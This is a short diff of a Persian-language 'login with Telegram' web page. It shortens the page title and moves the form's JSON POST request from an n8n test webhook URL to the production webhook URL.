@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>ورود با تلگرام - نسخه 1.2</title>
+  <title>ورود </title>
   <style>
     body {
       display: flex;
@@ -93,7 +93,7 @@
       resultBox.innerHTML = "<p>⏳ در حال ارسال...</p>";
 
       try {
-        const res = await fetch('https://30530-0p8me.s2.irann8n.com/webhook-test/login-form', {
+        const res = await fetch('https://30530-0p8me.s2.irann8n.com/webhook/login-form', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
